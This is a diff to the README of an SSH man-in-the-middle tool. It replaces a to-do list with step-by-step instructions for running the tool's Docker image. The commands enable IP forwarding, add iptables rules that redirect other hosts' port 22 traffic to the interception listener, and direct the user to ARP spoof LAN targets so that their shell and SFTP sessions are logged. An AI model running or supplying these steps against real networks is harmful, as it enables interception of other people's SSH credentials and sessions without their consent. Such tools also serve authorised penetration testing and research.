@@ -22,12 +22,28 @@ Of course, the victim's SSH client will complain that the server's key has chang
 * v1.0: May 16, 2017: Initial revision.
 
 
-## To Do
+## Running The Docker Image
 
-The following list tracks areas to improve:
+The quickest & easiest way to get started is to use the Docker image with SSH MITM pre-built.
 
-* Add port forwarding support.
-* Create wrapper script that detects when user is trying to use key authentication only, and de-spoof them automatically.
+1.) Obtain the image from Dockerhub with:
+
+    $ docker pull positronsecurity/ssh-mitm
+
+2.) Next, run the container with:
+
+    $ mkdir -p ${PWD}/ssh_mitm_logs && docker run --network=host -it --rm -v ${PWD}/ssh_mitm_logs:/home/ssh-mitm/log positronsecurity/ssh-mitm
+
+3.) Enable IP forwarding and NATing routes on your host machine:
+
+    # echo 1 > /proc/sys/net/ipv4/ip_forward
+    # iptables -P FORWARD ACCEPT
+    # iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
+    # iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222
+
+4.) Find targets on the LAN, and ARP spoof them (see below).
+
+5.) Shell and SFTP sessions will be logged in the `ssh_mitm_logs` directory.
 
 
 ## Initial Setup
